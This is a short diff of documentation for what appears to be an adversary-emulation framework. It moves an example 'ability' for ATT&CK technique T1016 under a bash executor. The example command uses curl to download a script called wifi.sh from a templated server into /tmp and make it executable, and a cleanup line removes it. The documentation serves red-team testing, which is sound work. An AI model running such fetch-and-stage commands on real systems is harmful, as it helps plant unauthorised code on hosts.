@@ -24,11 +24,13 @@ Below is an example ability. Read this carefully, it will be referenced later on
   technique:
     attack_id: T1016
     name: System Network Configuration Discovery
-  command: |
-    curl -sk -X POST -H 'file:wifi.sh' #{server}/file/download > /tmp/wifi.sh &&
-    chmod +x /tmp/wifi.sh
-  cleanup:
-    rm /tmp/wifi.sh
+  executors:
+    bash:
+      command: |
+        curl -sk -X POST -H 'file:wifi.sh' #{server}/file/download > /tmp/wifi.sh &&
+        chmod +x /tmp/wifi.sh
+      cleanup:
+        rm /tmp/wifi.sh
 ```
 
 ### Ability variables
